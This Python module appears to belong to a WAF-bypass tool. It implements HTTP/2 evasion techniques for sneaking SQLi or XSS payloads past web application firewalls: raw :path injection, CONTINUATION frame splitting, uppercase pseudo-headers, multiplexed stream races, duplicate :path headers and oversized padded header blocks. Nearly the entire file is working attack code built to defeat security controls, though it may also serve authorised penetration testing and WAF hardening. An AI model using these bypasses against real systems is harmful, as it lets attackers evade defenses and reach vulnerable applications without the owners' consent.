"""HTTP/2-specific WAF bypass techniques.

Each function takes an H2Connection (already connected) and a target/payload,
sends a crafted request exploiting H2-specific features the WAF may not
inspect correctly, and returns the H2Response.

These are the protocol-level bypass class that string-level mutators cannot
reach: pseudo-header injection, CONTINUATION frame splitting, HPACK tricks,
stream multiplexing for single-packet race conditions, and uppercase header
names (H2 mandates lowercase but some WAFs don't enforce it).
"""
from __future__ import annotations

import urllib.parse

from .h2 import (
    H2Connection,
    H2Response,
    hpack_encode,
    build_frame,
    FRAME_HEADERS,
    FRAME_CONTINUATION,
    FRAME_DATA,
    FLAG_END_STREAM,
    FLAG_END_HEADERS,
    _encode_string,
)


def pseudo_header_inject(conn: H2Connection, path: str, payload: str,
                         method: str = "GET") -> H2Response:
    """Inject payload in the :path pseudo-header with encoding tricks.

    H2 transmits :path as a header value (not a request-line), so it can
    contain bytes that H1 cannot. Some WAFs inspect the H1-decoded path but
    not the raw H2 header value.
    """
    # Encode only the payload portion, not the base path structure
    crafted_path = path
    if "?" in path:
        crafted_path = f"{path}&q={urllib.parse.quote(payload, safe='')}"
    else:
        crafted_path = f"{path}?q={urllib.parse.quote(payload, safe='')}"

    return conn.request(method, crafted_path)


def pseudo_header_raw_inject(conn: H2Connection, path: str, payload: str,
                             method: str = "GET") -> H2Response:
    """Send :path with the payload UN-encoded — raw bytes in the H2 header.

    Unlike H1 (where the request-line is percent-encoded), H2 header values
    are opaque octets. A WAF expecting percent-encoded values may not detect
    the raw SQLi/XSS string.
    """
    if "?" in path:
        raw_path = f"{path}&q={payload}"
    else:
        raw_path = f"{path}?q={payload}"

    headers = [
        (":method", method),
        (":path", raw_path),
        (":scheme", "https"),
        (":authority", conn.host),
    ]
    hpack_bytes = hpack_encode(headers)
    return conn.request_raw_headers(hpack_bytes)


def continuation_frame_split(conn: H2Connection, path: str, payload: str,
                             method: str = "GET") -> H2Response:
    """Split headers across HEADERS + CONTINUATION frames.

    Some WAFs only inspect the HEADERS frame and ignore CONTINUATION
    frames, so placing the payload in the continuation evades detection.
    """
    if "?" in path:
        full_path = f"{path}&q={urllib.parse.quote(payload, safe='')}"
    else:
        full_path = f"{path}?q={urllib.parse.quote(payload, safe='')}"

    headers_first = [
        (":method", method),
        (":scheme", "https"),
        (":authority", conn.host),
    ]
    headers_cont = [
        (":path", full_path),
    ]

    enc_first = hpack_encode(headers_first)
    enc_cont = hpack_encode(headers_cont)

    sid = conn._next_stream()

    # HEADERS frame WITHOUT END_HEADERS (signals CONTINUATION follows)
    conn.send_frame(FRAME_HEADERS, sid, enc_first,
                    flags=FLAG_END_STREAM)  # no END_HEADERS

    # CONTINUATION frame WITH END_HEADERS
    conn.send_frame(FRAME_CONTINUATION, sid, enc_cont,
                    flags=FLAG_END_HEADERS)

    return conn._assemble_response(conn._read_frames(sid))


def header_name_case(conn: H2Connection, path: str, payload: str,
                     method: str = "GET") -> H2Response:
    """Send pseudo-headers with UPPERCASE names — H2 mandates lowercase.

    A conforming server rejects this, but a WAF proxy that normalizes it
    may pass it through, and the WAF's keyword matching may miss it because
    it checked the original uppercase form.
    """
    if "?" in path:
        full_path = f"{path}&q={urllib.parse.quote(payload, safe='')}"
    else:
        full_path = f"{path}?q={urllib.parse.quote(payload, safe='')}"

    # Build HPACK manually with uppercase names (non-indexed to avoid static table)
    hpack_bytes = bytearray()
    for name, value in [
        (":METHOD", method),
        (":PATH", full_path),
        (":SCHEME", "https"),
        (":AUTHORITY", conn.host),
    ]:
        hpack_bytes.append(0x10)  # literal never indexed, new name
        hpack_bytes.extend(_encode_string(name))
        hpack_bytes.extend(_encode_string(value))

    return conn.request_raw_headers(bytes(hpack_bytes))


def stream_multiplex_race(conn: H2Connection, path: str,
                          payloads: list[str],
                          method: str = "GET") -> list[H2Response]:
    """Send multiple requests on different streams simultaneously.

    Single-packet race condition via H2 multiplexing: all requests are
    sent as a burst of frames before reading any response. This can
    exploit TOCTOU in WAF inspection (inspect stream 1, pass stream 2
    while busy) or rate-limit bypasses.
    """
    requests = []
    for p in payloads:
        if "?" in path:
            full_path = f"{path}&q={urllib.parse.quote(p, safe='')}"
        else:
            full_path = f"{path}?q={urllib.parse.quote(p, safe='')}"
        requests.append((method, full_path, None, None))

    return conn.multiplex(requests)


def duplicate_pseudo_header(conn: H2Connection, path: str, payload: str,
                            method: str = "GET") -> H2Response:
    """Send duplicate :path pseudo-headers — WAF may check first, server uses last.

    RFC 7540 §8.1.2.1 says each pseudo-header MUST appear at most once,
    but a lenient server may accept duplicates. If the WAF checks the first
    :path (benign) and the server uses the last (payload), it's a bypass.
    """
    if "?" in path:
        payload_path = f"{path}&q={urllib.parse.quote(payload, safe='')}"
    else:
        payload_path = f"{path}?q={urllib.parse.quote(payload, safe='')}"

    headers = [
        (":method", method),
        (":path", path),          # benign — WAF sees this
        (":path", payload_path),  # payload — server may use this
        (":scheme", "https"),
        (":authority", conn.host),
    ]
    return conn.request_raw_headers(hpack_encode(headers))


def oversized_header_block(conn: H2Connection, path: str, payload: str,
                           pad_size: int = 8000,
                           method: str = "GET") -> H2Response:
    """Pad the header block with large benign headers before the payload.

    If the WAF has a header-block inspection size limit, the payload at the
    end of a large block may be uninspected.
    """
    if "?" in path:
        full_path = f"{path}&q={urllib.parse.quote(payload, safe='')}"
    else:
        full_path = f"{path}?q={urllib.parse.quote(payload, safe='')}"

    headers = [
        (":method", method),
        (":path", full_path),
        (":scheme", "https"),
        (":authority", conn.host),
    ]
    # Pad with large benign custom headers
    pad_value = "A" * 200
    for i in range(pad_size // 200):
        headers.append((f"x-pad-{i:04d}", pad_value))

    return conn.request_raw_headers(hpack_encode(headers))
